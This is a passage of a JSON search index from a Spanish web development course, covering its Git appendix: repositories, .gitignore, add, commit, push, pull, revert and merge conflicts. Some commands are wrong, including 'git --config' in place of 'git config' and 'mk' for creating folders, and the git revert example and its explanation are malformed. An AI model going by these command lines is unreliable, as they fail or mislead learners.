  },"110": {
    "doc": "8.8 Más tecnologías aún",
    "title": "8.8 Más tecnologías aún",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/otros/mas-tecnologias-aun.html",
    "relUrl": "/otros/mas-tecnologias-aun.html"
  },"111": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "Apéndice 1. Sistemas de control de versiones. Git",
    "content": ". | A1.1. Sistemas de control de versiones . | A1.1.1. ¿Qué es un sistema de control de versiones? | A1.1.2. ¿Cómo funcionan los sistemas de control de versiones? | . | A1.2. Git básico . | A1.2.1. Poniendo en marcha Git | A1.2.2. Creando un repositorio nuevo | . | A1.3. Trabajo básico con Git . | A1.3.1. Un momento… ¿Staging quéeee? | A1.3.2. Hacer commit | A1.3.3. Subir el commit: hacer push | A1.3.4. Bajar la última versión del código: hacer pull | A1.3.5. Resumiéndolo todo: flujo de trabajo habitual con git | . | A1.4. Algunas cosillas avanzadas sobre git . | A1.4.1. Regreso al pasado: cómo revertir los cambios | A1.4.2. Cuando dos personas se encaprichan del mismo archivo | A1.4.3. Proyectos que se complican: cómo crear ramas | A1.4.4. ¿Aún quieres saber más? | . | . ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#ap%C3%A9ndice-1-sistemas-de-control-de-versiones-git",
    "relUrl": "/scv-git/#apéndice-1-sistemas-de-control-de-versiones-git"
  },"112": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.1. Sistemas de control de versiones",
    "content": "Es inconcebible que un desarrollador trabaje en la actualidad sin un sistema de control de versiones. Fíjate que en la frase anterior no tiene cabida tu opinión. Lo siento, pero es lo que hay. No importa si te gustan estos sistemas o no. No importa si estás los usas de forma habitual o siempre has huido de ellos como de la peste. No importa si ni siquiera sabes qué son o cómo funcionan. Si quieres dedicarte profesionalmente al desarrollo de software, tienes que conocerlos porque te los vas a encontrar vayas donde vayas. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a11-sistemas-de-control-de-versiones",
    "relUrl": "/scv-git/#a11-sistemas-de-control-de-versiones"
  },"113": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.1.1. ¿Qué es un sistema de control de versiones?",
    "content": "Un sistema de control de versiones es un almacén en la nube pensado para equipos de desarrollo de software. Es decir, como Google Drive, pero a lo bestia. El sistema de control de versiones no solo sirve para que un puñado de usuarios (entre uno y miles) suban su código fuente a la nube para ponerlo a salvo de posibles problemas con las máquinas locales, sino que, además, permite: . | Conservar absolutamente todo el historial de versiones previas. | Documentar cada cambio, de manera que siempre sea posible saber quién, cómo, dónde, cuándo y por qué escribió cada línea de código. | Revertir el software a un estado anterior en cualquier momento. | Crear ramas o “estados alternativos” del software, que luego podrán fusionarse con otras ramas o abandonarse sin llegar a nada. | Crear “forks” o réplicas del sistema que luego podrán evolucionar de forma independiente (o volver a fusionarse con el contenido original). | Evitar conflictos cuando el mismo código fuente ha sido editado simultánemente por dos personas. Y, en caso de que estos conflictos ocurran, ayudar a resolverlos. | . Se trata de un buen puñado de funciones, ¿verdad? Ese es el motivo por el que absolutamente todas las organizaciones serias que se dedican a desarrollar software utilizan algún sistema de control de versiones. Pero es que incluso para un programador/a solitario, que trabaja de forma autónoma, las ventajas de usar uno de estos sistemas superan de lejos a los inconvenientes, porque… espera un momento… ¡Resulta que no tienen ningún inconveniente! . Así que ya lo sabes: si aún no los usas, este es el momento de hacer un esfuerzo e incorporar un sistema de control de versiones a tu vida. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a111-qu%C3%A9-es-un-sistema-de-control-de-versiones",
    "relUrl": "/scv-git/#a111-qué-es-un-sistema-de-control-de-versiones"
  },"114": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.1.2. ¿Cómo funcionan los sistemas de control de versiones?",
    "content": "Existen muchos sistemas de control de versiones, aunque el mercado está dominado por unos pocos de ellos: CVS, Subversion, Mercurial, Bazaar y, sobre todo, Git. Cada uno tiene sus propias peculiaridades, pero suelen compartir varias características comunes: . | El código fuente del proyecto (y todas sus versiones previas) se guarda en uno o varios servidores. Esa colección de código fuente se denomina repositorio. El servidor puede estar en Internet y pertenecer a una compañía externa. También puede estar en nuestra intranet, instalado en una de nuestras máquinas. O puede estar en nuestro propio ordenador. | Los repositorios pueden ser remotos (si están en otra máquina distinta de la nuestra) o locales (si están en nuestra máquina). | Siempre se trabaja sobre el repositorio local. Cuando una funcionalidad del código se termina, el código fuente modificado se sube al repositorio remoto, para que el resto de miembros del equipo puedan disponer de él. | Si otra persona del equipo ha modificado los mismos archivos fuente que nosotros, el sistema de control de versiones nos avisará del conflicto durante la sincronización y nos obligará a hacer manualmente una fusión de los archivos afectados, mostrándonos las diferentes versiones del mismo, antes de completar la sincronización. | . La sincronización con el repositorio remoto, por lo tanto, no puede ser automática (como en Google Drive o Dropbox), sino que hemos de hacerla explícita, momento en el cual el sistema nos avisará de posibles conflictos. Esta es la única manera de resolver adecuadamente esos conflictos en proyectos donde haya mucha gente trabajando simultáneamente. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a112-c%C3%B3mo-funcionan-los-sistemas-de-control-de-versiones",
    "relUrl": "/scv-git/#a112-cómo-funcionan-los-sistemas-de-control-de-versiones"
  },"115": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.2. Git básico",
    "content": "Git es, en la actualidad, el sistema de control de versiones más utilizado del mundo con diferencia. También es uno de los más completos y complejos. Así que, si aprendes a utilizar Git, podrás apañártelas con cualquier otro sistema de control de versiones. En esta sección vamos a ver cómo se usa Git a nivel básico. El acceso a las funciones avanzadas irá viniendo solo, con el tiempo y el uso. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a12-git-b%C3%A1sico",
    "relUrl": "/scv-git/#a12-git-básico"
  },"116": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.2.1. Poniendo en marcha Git",
    "content": "Git es un sistema de control de versiones que se creó inicialmente para desarrollar el núcleo de Linux. Es de código abierto (opensource). Eso quiere decir que cualquiera puede coger el código, modificarlo, adaptalo y distribuirlo. Por eso encontrarás multitud de implementaciones de Git, así como muchos servidores y clientes que lo usan. Todos son compatibles entre sí. Git crea repositorios locales y remotos que hay que mantener sincronizados manualmente. Para usar Git, necesitas al menos: . | Instalar un cliente de Git en tu ordenador de trabajo. | Instalar un servidor de Git en el ordenador donde vayas a alojar el repositorio remoto. | . Para el servidor Git, mucha gente utiliza servidores gratuitos disponibles en Internet. Los más conocidos de ellos son GitHub y GitLab. Son sitios web donde te registras y ¡voilà!, ya tienes disponible un servidor Git en línea para que funcione de repositorio remoto. Además, estos sitios proporcionan características adicionales muy convenientes, como sistemas de gestión de issues o tareas pendientes, gestión de proyectos, estadísticas, evaluación de la calidad de software, etc. También funcionan como redes sociales para desarrolladores. En fin, que, salvo que seas un paranoico de la seguridad o estés desarrollando código ultrasecreto para la NSA o el CSIF, usar GitHub o GitLab como repositorio remoto es la opción más interesante. Así que ya puedes dejar de leer esto y registrarte ahora mismo en alguno de los dos. ¿Ya estás de regreso? Vale, ahora tienes que instalarte en tu ordenador un cliente Git. Clientes Git hay muchos, algunos más bonitos que otros. Yo te recomiendo el cliente básico en modo texto, con el que tendrás que salirte a la consola y teclear comandos. Teclear comandos incomprensibles de forma rápida y segura siempre queda muy bien para presumir. Aparte de eso, aprenderse los comandos básicos de Git te salvará la vida en algún momento de tu futuro profesional, te lo aseguro, así que es una buena inversión de tiempo. Puedes encontrar los clientes oficiales de Git en la web del proyecto: https://git-scm.com/ . Cuando hayas aprendido a apañarte con los comandos, es posible que te gusten tanto que ya no quieras recurrir a los clientes gráficos. Pero, por si acaso no es así, te comento que existen mogollón de ellos que te permitirán sincronizar tus archivos con un solo clic y resolver conflictos de forma rápida y muy visual. Algunos de ellos son: GitHub Desktop (ofrecido por GitHub), GitKraken, Git Cola o Tortoise Git. Por último, ten en cuenta que todos los entornos de desarrollo medianamente potentes ofrecen una integración absoluta con Git. Es decir, que si usas Visual Studio Code, Eclipse, NetBeans o muchos otros, no necesitarás ningún cliente git adicional, porque ya lo traen incorporado. Tan solo debes configurar la ruta el repositorio remoto y al local, y hala, a programar y a sincronizar como si no hubiera un mañana. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a121-poniendo-en-marcha-git",
    "relUrl": "/scv-git/#a121-poniendo-en-marcha-git"
  },"117": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.2.2. Creando un repositorio nuevo",
    "content": "Bien, pues ya tenemos nuestra cuenta en GitHub o GitLab y hemos instalado un cliente Git en nuestra máquina. ¿Ahora qué? . Podemos encontrarnos ante dos escenarios diferentes: . | Voy a empezar un proyecto nuevo y quiero inicializar un repositorio en blanco. | Ya tengo mi código fuente (todo o una parte) escrito y quiero añadirlo a un repositorio git. | . Vamos a ver cómo proceder en cada caso. Lo haremos mostrando cómo se usa el cliente git de línea de comando. Desde los clientes gráficos, el proceso será parecido, pero tendrás que trastear con el cliente en cuestión o leerte su documentación para ver los detalles. Caso 1: Voy a empezar un proyecto nuevo y quiero inicializar un repositorio en blanco. | Abre un terminal de línea de comandos y muévete al directorio o carpeta donde tienes pensado crear tu código fuente. Usa para ello los comandos cd carpeta (para cambiar de carpeta) o mk carpeta (para crear una carpeta nueva). | Para crear un repositorio git local en la carpeta elegida, simplemente teclea este comando: . $ git init . | Para conectar este repositorio local con un repositorio remoto en GitHub o GitLab, escribe a continuación este comando: . $ git remote add origin &lt;URI&gt; . Sustituye “URI” por la dirección de tu repositorio que te habrá proporcionado GitHub o GitLab. Por ejemplo, en GitHub, una URI de repositorio tiene un aspecto como este: https://github.com/usuario/nombre-repositorio.git). Obviamente, el repositorio remoto deberías haberlo creado antes desde la web de GitHub o GitLab. | . Eso es todo. A partir de ahora, podrás empezar a desarrollar tu código en local y a sincronizar tus archivos con el repositorio remoto cada vez que lo necesites. El procedimiento para hacer esto último lo describimos un poco más adelante. Caso 2: Ya tengo mi código fuente y quiero añadirlo a un repositorio git . Este caso es un poquito más complejo, pero tampoco mucho. Asegúrate de tener ya creado un repositorio (vacío) en GitHub o GitLab antes de seguir esta guía. | Abre un terminal de línea de comandos y muévete a la carpeta donde tengas tu código fuente. Usa para ello el comando cd carpeta. | Para crear un repositorio git local en esa carpeta, simplemente teclea este comando: . $ git init . | Para conectar este repositorio local con un repositorio remoto en GitHub o GitLab, escribe esto: . $ git remote add origin &lt;URI&gt; . Sustituye “URI” por la dirección de tu repositorio que te habrá proporcionado GitHub o GitLab. Por ejemplo, en GitHub, una URI de repositorio tiene un aspecto como este: https://github.com/usuario/nombre-repositorio.git) . | Edita el archivo .gitignore para incluir en él los archivos y carpetas que no quieres incluir en el repositorio. Más adelante hablaremos del archivo .gitignore con más detalle, porque es muy importante. | Haz tu primer commit para añadir todo el código fuente que ya tienes: . $ git add * $ git commit -m \"Primer commit con todo el código preexistente\" . | Sube el código de ese commit a tu repositorio remoto (te pedirá tu usuario y contraseña en GitHub o GitLab): . $ git push . | . Si ahora entras en tu perfil de GitHub o GitLab, verás que el repositorio remoto ya contiene todos los archivos que tenías en tu proyecto (excepto los que señalaste en .gitignore). Los repositorios local y remoto ya están creados y puedes empezar a trabajar con normalidad, escribiendo código y subiéndolo al repositorio remoto cuando lo necesites. Este proceso lo describiremos en detalle enseguida. Si no has entendido alguno de estos pasos, no te agobies. Enseguida te quedarán más claros. Más cosas sobre la inicialización de un repositorio . Hay otro par de cosas que te interesa hacer al iniciarlizar un repositorio. Solo tendrás que hacerlo una vez y, después, tu repositorio lo recordará. Después del git init, puedes indicarle al repositorio qué usuario de GitHub o GitLab va a realizar los commits. Esto se hace así: . $ git --config user.name \"Mi-nombre-de-usuario\" $ git --config user.email \"Mi-email\" . Para comprobar que la información es correcta, simplemente teclea: . $ git --config list . ¡Antes de continuar! No te olvides de .gitignore . Una última cosita antes de describir cómo es el trabajo cotidiano con git y qué significa todo eso de los commits. Esa cosita es sobre el archivo .gitignore. Es un archivo muy importante que debería estar en el directorio raíz de tu proyecto. Si no existe, créalo. Ten en cuenta que en los sistemas GNU/Linux y Mac, los archivos cuyo nombre empiezan por un punto se consideran ocultos, por lo que es posible que el archivo esté ahí sin que lo veas. Ese archivo contiene una lista de todas las cosas que no se deben subir al repositorio remoto. Esto incluye, entre otros: . | Los archivos de configuración. Es habitual en una aplicación web tener un archivo de configuración (llamado config.php o algo parecido) con un puñado de variables donde se guarda el host de la base de datos, el usuario y la contraseña para ese host, el nombre de la base de datos, etc. Y, vamos a ver, ¿de verdad quieres que cualquiera que acceda a tu repositorio de GitHub o GitLab vea esa información? . Además del problema de seguridad que puede suponerte (sobre todo si, como el 99% de los desarrolladores, usas el acceso root a tu servidor local de bases de datos mientras estás desarrollando un nuevo proyecto), es que no tiene sentido subir esa información al repositorio remoto, porque será diferente en cada servidor donde la aplicación se ponga en producción. Lo que sí suele hacerse es crear un archivo de configuración de ejemplo (algo como config-example.php), donde se muestre la estructur que debe tener config.php pero se dejen en blanco los valores de las variables. Ese archivo sí que puede sincronizarse con el resto del código y subirse a GitHub o GitLab. | Archivos de recursos que no forman parte de la aplicación. Imagina que estás programando una aplicación web para una biblioteca. Esa aplicación usa algunas imágenes para construir sus vistas (por ejemplo, una hermosa fotografía de un libro antiguo para el encabezamiento). Esas imágenes sí forman parte de la aplicación y sí deben subirse al repositorio remoto. Pero ahora supón que, como es lógico, para probar la aplicación has creado un montón de libros falsos en tu base de datos local. Cada vez que añades un libro falso, le asignas una imagen de la portada (falsa también), que la aplicación almacenará en algún directorio del servidor local. Esas imágenes forman parte de los datos de prueba, no de la propia aplicación, y, por tanto no deberían subirse a GitHub ni GitLab. El directorio completo donde almacenes esas imagenes debería incluirse en .gitignore. Si no lo haces así, llenarás el repositorio remoto de basurilla y, además, harás que ocupe mucho más espacio del necesario, hasta el extremo que una clonación del repositorio puede tardar varias horas y ocupar muchos gigabytes. Ten en cuenta que el repositorio no solo contiene el estado actual del proyecto, sino también todos los estados anteriores, lo que incluye todas las imágenes de libros falsos que hayas podido añadir alguna vez durante el desarrollo. Esto no solo es aplicable a imágenes, sino a cualquier otro recurso que use la aplicación y que no forme parte de la propia aplicación: sonidos, fuentes tipográficas, vídeos, etc. | Bibliotecas de terceros. A menudo, recurrimos a bibliotecas de terceros para usarlas en nuestra aplicación. Incluir ese código en nuestro repositorio nos puede meter en un embrollo legal (mírate bien la licencia de uso de todas las bibliotecas que vayas a utilizar) y, además, nos puede hacer engordar innecesariamente el repositorio. Tendrás que valorar una a una si es conveniente incluir determinada librería o no. Las librerías no incluidas deberán ser instaladas manualmente cuando la aplicación se despliegue en un servidor, lo cual deberás explicar muy bien en la documentación. Por ejemplo, en el caso de Laravel, se aconseja no incluir la carpeta “vendor” en el repositorio remoto. Es decir, hay que añadir la carpeta “vendor” a .gitignore antes de la primera sincronización. En “vendor” se encuentran todas las librerías de terceros que usa Laravel. Entonces, para desplegar esta aplicación en un servidor, ¿de dónde sacamos todas esas librerías? Fácil: cuando despleguemos el código en un servidor, solo tendremos que ejecutar “composer update” en el directorio raíz de la aplicacion, y el propio composer se encargará de instalar las librerías que sean necesarias en las versiones más adecuadas para ese servidor. | . ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a122-creando-un-repositorio-nuevo",
    "relUrl": "/scv-git/#a122-creando-un-repositorio-nuevo"
  },"118": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.3. Trabajo básico con Git",
    "content": "Ya tenemos nuestros repositorios local y remoto inicializados y conectados, y el archivo .gitignore a punto. ¿Qué hacemos ahora? . Muy fácil: ponernos a trabajar como si git no existiera. Y luego, cuando des por finalizada una parte de la aplicación (un método, una clase, una funcionalidad concreta: tú decides cada cuánto tiempo haces esto), pasarla a la Staging Area. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a13-trabajo-b%C3%A1sico-con-git",
    "relUrl": "/scv-git/#a13-trabajo-básico-con-git"
  },"119": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.3.1. Un momento… ¿Staging quéeee?",
    "content": "La Staging Area es como la pista de despegue de Git. La idea es la siguiente: Git no quiere sincronizar tus archivos con el repositorio remoto de forma automática (como hacen las plataformas para el público general, como Google Drive o Dropbox), porque sabe que los programadores producimos mucha basura al cabo del día. Si cada vez que escribimos una basurilla, Git la sincronizara con el remoto, el resto de personas del proyecto estarían recibiendo nuestra basura de forma permanente. Y nosotros la de esas personas. Y esparcir basura no es una buena política. Así que Git quiere que seas muy consciente de cuándo deseas sincronizar algo, y de qué es lo que deseas sincronizar. Quiere que te tomes el trabajo (que tampoco es para tanto, la verdad) de emplear medio minuto de tu tiempo para decirle: “eh, Git, he estado currándome estos dos archivos esta mañana y creo que ahora ya no son una basura”. Para eso sirve la Staging Area. Tienes que pasar los archivos que ya no son una basura a la Staging Area. Y tienes que hacerlo tú, generalmente cuando hayas terminado una funcionalidad y la hayas probado adecuadamente. Lo bastante como para que no te avergüence que otras personas del equipo reciban tu código. Para añadir archivos a la Staging Area se usa el comando git add, así: . $ git add archivo1 archivo2 archivo3 ... Se pueden añadir carpetas completas: . $ git add carpeta1 carpeta2 ... Y también se pueden usar símbolos comodín, como el asterisco. De modo que, si estás muy, pero que muy seguro/a de que todos los archivos que han andado tocando desde el último commit están en un estado aceptable, puedes hacer esto para que git se encargue de añadir todos los archivos modificados recientemente a la Staging Area: . $ git add * . Por fin, cuando tengas una o varias cosas preparadas en la Staging Area… Bueno, entonces llega el momento de hacer un commit. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a131-un-momento-staging-qu%C3%A9eee",
    "relUrl": "/scv-git/#a131-un-momento-staging-quéeee"
  },"120": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.3.2. Hacer commit",
    "content": "Un commit (palabra que podríamos traducir por “perpetrar”) consiste en empaquetar todos los cambios de la Staging Area para enviarlos a otro repositorio, normalmente el repositorio remoto. El decir, con el commit le decimos a Git: “quiero que prepares todo el código que te he puesto en la Staging Area a para enviarlo a GitHub” (o a dónde sea). Se puede hacer un commit por cada pequeña modificación que introducimos en la Staging Area, o se pueden preparar muchos archivos en la Staging Area y luego empaquetarlos en un único mega-commit. Eso lo decidís tú y tu equipo de desarrollo. Pero suele ser buena idea hacer commits de funcionalidades o tareas individuales. Es decir, si esta mañana he estado trabajando en dos funcionalidades, “Añadir usuarios nuevos” y “Modificar la vista de edición de usuarios”, es mejor que haga dos commits separados para cada una de esas funcionalidades. Esto es así porque, a cada commit, le tengo que añadir obligatoriamente un texto descriptivo donde indique qué cambios estoy subiendo con ese commit. El comando para hacer un commit es: . $ git commit -m \"Mensaje\" . Ahora saco mi bola de cristal y te digo: no tardarás ni una semana en empezar a hacer commits cuyo texto descriptivo será algo como “aslkdaslkjda”, “aaa”, “yoquésé”. Eso es una pésima idea. Antes o después, alguien del equipo meterá la pata, subirá un cambio indebido y todo el repositorio explotará. Entonces, intentaréis regresar a un estado en el que el código aún funcionaba, pero encontraréis que los últimos commits tienen explicaciones incomprensibles como “aslkdaslkjda”, “aaa” y “yoquésé”. Y sudaréis tinta para descubrir cuál fue el commit explosivo. Los commits deben llevar textos descriptivos breves pero informativos. Por ejemplo: “Arreglo el fallo del id de usuario inexistente al actualizar foto de perfil” o “Elimino el botón de modificar de la vista de libros”. Pero, ¡ojo!, hacer commit no sube los archivos al repositorio remoto. Todavía no. Recuerda que Git quiere que estés muy seguro/a de que subes lo que realmente tienes que subir, así que aún te falta un último paso: hacer push. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a132-hacer-commit",
    "relUrl": "/scv-git/#a132-hacer-commit"
  },"121": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.3.3. Subir el commit: hacer push",
    "content": "El último paso para enviar nuestros cambios locales al repositorio remoto (típicamente, GitHub o GitLab) consiste en hacer push. Es decir, literalmente, “empujar” los cambios al repositorio remoto. La operación push enviará todos los commits que aún no se hayan enviado al repositorio remoto. A partir de ese momento, estarán disponibles para el resto de miembros del equipo. Pero solo a partir de ese momento. Para hacer push, basta con escribir: . $ git push . Lo normal es que el repositorio remoto te pida tu nombre de usuario y contraseña, pero eso dependerá de si el acceso a ese repositorio está autenticado o no. Por supuesto, tanto GitHub como GitLab te solicitarán que te identifiques. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a133-subir-el-commit-hacer-push",
    "relUrl": "/scv-git/#a133-subir-el-commit-hacer-push"
  },"122": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.3.4. Bajar la última versión del código: hacer pull",
    "content": "Si podemos subir nuestros cambios al repositorio remoto, tendremos que tener una forma de bajar los cambios del resto de miembros del equipo, ¿verdad? . Por supuesto, existe un comando para ello. Es este: . $ git pull . Es recomendable hacer pull antes de hacer push, por si alguien ha tocado alguno de los archivos que nosotros pretendemos subir. En ese caso, Git nos avisará del conflicto y nos ayudará a resolverlo (más adelante veremos cómo). No podremos hacer push hasta resolver ese conflicto, para evitar pérdidas de código. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a134-bajar-la-%C3%BAltima-versi%C3%B3n-del-c%C3%B3digo-hacer-pull",
    "relUrl": "/scv-git/#a134-bajar-la-última-versión-del-código-hacer-pull"
  },"123": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.3.5. Resumiéndolo todo: flujo de trabajo habitual con git",
    "content": "Si resumimos lo dicho hasta ahora, tenemos que, después de inicializar el repositorio (cosa que hay que hacer solo una vez), el trabajo cotidiano con Git consiste en: . | Desarrollar nuestra aplicación con normalidad, como si git no existiera. | Cuando terminamos de hacer algo, añadirlo a la Staging Area (git add). | Cada cierto tiempo, o cuando acabamos una funcionalidad, empaquetar todos los cambios que esperan en la Staging Area en un commit (git commit). | Bajarnos los commits del resto de miembros del equipo (git pull) | Subir nuestros commits al repositorio remoto (git push) | . Podemos verlo gráficamente en el siguiente esquema. Las tres primeras columnas (workspace, Staging Area y Local Repo) están en nuestro ordenador de trabajo. El repositorio remoto (Remote Repo) está en un servidor, como GitHub o GitLab. Workspace Staging area (INDEX) Local repo (HEAD) Remote repo | | | git add → | | | git commit → | | | | ← ← ← ← ← | ← ← ← ← ← | ← git pull | | | | git push → | | | | | . Un último apunte: te voy a chivar un comando muy útil de git cuando no estás muy seguro de qué archivos has estado tocando últimamente (¿a quién no le ha pasado eso? ¿Eh?). Este comando te resumirá el estado de tu repositorio local, indicándote qué archivos han sido modificados (pero no están en la Staging Area), qué archivos están preparados en la Staging Area (pero no en un commit) y, por supuesto, qué commits están hechos pero aún sin subir. Todo eso, gratis y tecleando este humilde comando: . $ git status . ¿Es potente o no es potente este Git? Pues aún no has visto nada. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a135-resumi%C3%A9ndolo-todo-flujo-de-trabajo-habitual-con-git",
    "relUrl": "/scv-git/#a135-resumiéndolo-todo-flujo-de-trabajo-habitual-con-git"
  },"124": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.4. Algunas cosillas avanzadas sobre git",
    "content": "Solo con lo que hemos visto hasta ahora (add, commit, push y pull) ya tienes suficiente para empezar a funcionar con git. Luego, conforme te surjan otras necesidades, puedes ir curioseando por internet para profundizar en ciertos aspectos. Una de esas “necesidades” que te surgirán antes o después consiste en lo siguiente: . Imagínate la escena: un día llegas a clase después de haberte acosatado a las tantas trabajando en tu proyecto. Antes de acostarte hiciste un push para subir todos tus cambios y puedes jurar que todo funcionaba perfectamente. Pero ahora, tú y el resto de miembros de tu equipo acabáis de hacer pull y… ¡BUM! El proyecto entero salta por los aires. El homepage no carga. Otras rutas que estás seguro de que funcionaban hace unas horas ahora no responden. ¿Qué narices ha pasado? . Tranquilidad: ahí está Git para sacarte del embrollo. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a14-algunas-cosillas-avanzadas-sobre-git",
    "relUrl": "/scv-git/#a14-algunas-cosillas-avanzadas-sobre-git"
  },"125": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.4.1. Regreso al pasado: cómo revertir los cambios",
    "content": "Las causas de un desastre como ese pueden ser tantas que, en la práctica, es como si fueran infinitas. Un problema con el proxy, un merge mal hecho, una desconfiguración de uno de los servidores locales que ha afectado a algún archivo clave, un error de algún miembro del equipo que ha sobreescrito cientos de archivos con versiones incorrectas… Causas infinitas, como te digo. No suele compensar el esfuerzo de buscar la razón última de lo que ha ocurrido, salvo que os pase esto con cierta regularidad: entonces sí que es cuestión de preocuparse. La mayoría de las veces es un problema puntual que puede resolverse de un modo muy simple: volviendo a la última versión estable. En primer lugar, si lo que quieres es revertir cambios de los que aún no has hecho commit, es tan fácil como: . $ git reset --hard . Pero, la mayor parte de las veces, el problema viene de cambios de los que no solo ya se ha hecho commit, sino que incluso se han subido al repositorio remoto. ¿Cómo descartamos esos cambios para volver a un estado anterior? . En primer lugar, si aún no lo has hecho, ejecuta un git pull para traerte la última versión del código a tu repositorio local. Luego, utiliza el comando git log: . $ git log (muestra historial de cambios) $ git log --oneline (muestra historial de cambios simplificado) . Con esto obtendrás una lista, ordenada por cronología inversa (de más reciente a más antiguo), de todos los commits que has hecho en el repositorio. Observa que cada commit está identificado con un id único en hexadecimal. Cada id de commit está acompañado de su descripción. Si habéis sido cuidadosos con los commits y les habéis puesto descripciones representativas (y no “asdfasdf” o “aaa”), resutará fácil localizar en esa lista el commit causante del destrozo. A continuación, usa el comando git revert para regresar al commit inmediatamente anterior a aquel en el que se produjo el caos: . $ git revert HEAD [main id-de-commit] revert \"Mensaje del revert\" . Lo que hace este comando es devolver tu repositorio local (HEAD) al commit “id-del-commit”. Pero, ojo, que no elimina todos los commits posteriores, sino que crea un nuevo commit (main) con el “Mensaje del revert” que le hayas indicado. En este nuevo commit habrá desaparecido todo el código conflictivo. El proyecto volverá a estar en un estado estable. Ahora bastará con hacer git push para subir el nuevo commit al repositorio remoto y que todos los miembros del equipo puedan replicarlo en sus máquinas. Es posible que, en el proceso, hayáis perdido algo de código valioso: todo depende de cuánto hayáis tenido que retroceder en el historial de commits hasta alcanzar un estado válido. Pero ese código en realidad no se ha perdido, porque los commits siguen ahí, en el historial de git. Existe una forma de poner el repositorio local en un commit concreto. Si lo haces y abres cualquier archivo fuente, lo encontrarás como estaba en ese commit, no como está en el último. ¿No es maravilloso? Así, podrás recuperar manualmente el código que pudiera haberse perdido al hacer el git revert. El comando que te permite saltar momentáneamente a cualquier commit es git checkout: . $ git checkout id-del-commit . Ahora puedes ver y rescatar el código fuente válido sin temor: nada de lo que hagas en este estado afectará al tu proyecto, porque los cambios se perderán cuando salgas de este “viaje en el tiempo” (salvo que crees una nueva rama del proyecto, pero esa es otra historia). Y, para regresar al presente, es decir, al último commit, basta con teclear: . $ git checkout main . ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a141-regreso-al-pasado-c%C3%B3mo-revertir-los-cambios",
    "relUrl": "/scv-git/#a141-regreso-al-pasado-cómo-revertir-los-cambios"
  },"126": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.4.2. Cuando dos personas se encaprichan del mismo archivo",
    "content": "Cuando ejecutas git pull, traes a tu repositorio local las versiones más recientes de todos los archivos del proyecto. Esto ya lo sabíamos. Si git pull se ejecuta sin contratiempos, aparecerá un mensaje informándote de ello. Pero los contratiempos existen, qué le vamos a hacer. La vida sería muy aburrida y predecible sin ellos. El contratiempo más habitual, con diferencia, al hacer git pull es el aviso de un conflicto el alguno de los archivos modificados en el repositorio remoto. Eso quiere decir que tú has estado tocando el código de un archivo al mismo tiempo que otra persona de tu equipo. Supongamos que, en un archivo A, tú has añadido las líneas A1, A2 y A3, mientras que otra persona ha añadido las líneas A4, A5 y A6. Si la otra persona ha subido el archivo A al repositorio remoto antes que tú, git se dará cuenta cuando intentes hacer git pull de que tu copia local del archivo y la que hay en el repositorio remoto no coinciden: no solo porque la tuya tiene las nuevas líneas A1, A2 y A3, sino porque a la tuya le faltan las líneas A4, A5 y A6. En ese caso, y para no perder ninguna de las nuevas líneas de código, git te mostrará un mensaje de advertencia y creará una versión nueva del archivo A en la que estarán todas las líneas de código nuevas, tanto las tuyas como las de la otra persona, rodeadas de unas marcas de texto como estas: . &lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD espacio ============ Espacio &gt;&gt;&gt;&gt;&gt;&gt;&gt; nueva-rama . Ahora, lo único que tienes que hacer es buscar manualmente esas líneas conflictivas y resolverlas a mano, es decir, quedarte con las líneas correctas y borrar las que no lo sean. Borra también todas las marcas que ha puesto ahi git para indicarte el conflicto. Si usas cualquier editor de texto medianamente potente, te mostrará esas líneas resaltadas e incluso te ayudará a encontrarlas. Una vez que hayas resuelto manualmente las líneas en conflicto, basta con guardar los cambios y hacer git add y git commit -m “Resolviendo el conflicto bla,bl,bla” para que el git pull y el git push vuelvan a funcionar a la perfección. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a142-cuando-dos-personas-se-encaprichan-del-mismo-archivo",
    "relUrl": "/scv-git/#a142-cuando-dos-personas-se-encaprichan-del-mismo-archivo"
  },"127": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.4.3. Proyectos que se complican: cómo crear ramas",
